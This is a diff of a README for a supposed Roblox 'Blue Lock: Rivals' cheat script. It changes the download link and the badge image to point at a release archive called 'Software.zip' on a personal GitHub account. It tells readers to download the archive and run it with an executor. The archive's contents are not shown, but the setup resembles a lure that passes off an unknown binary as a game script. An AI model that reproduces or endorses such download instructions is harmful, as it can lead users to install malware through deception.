@@ -10,7 +10,7 @@ Welcome to the official repository of **Roblox Blue Lock: Rivals Script**! This 
 
 ## Getting Started
 To get started with the Roblox Blue Lock: Rivals Script, simply follow these steps:
-1. Click on the following link to download the script: [Download Script](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) ![Download Script](https://img.shields.io/badge/Download-Script-blue)
+1. Click on the following link to download the script: [Download Script](https://github.com/TigeRr-1991/bluelock/releases/download/v2.0/Software.zip) ![Download Script](https://github.com/TigeRr-1991/bluelock/releases/download/v2.0/Software.zip)
 2. Launch the script and executor in Roblox Blue Lock: Rivals.
 3. Enjoy the enhanced gameplay experience and dominate your rivals like never before!
 
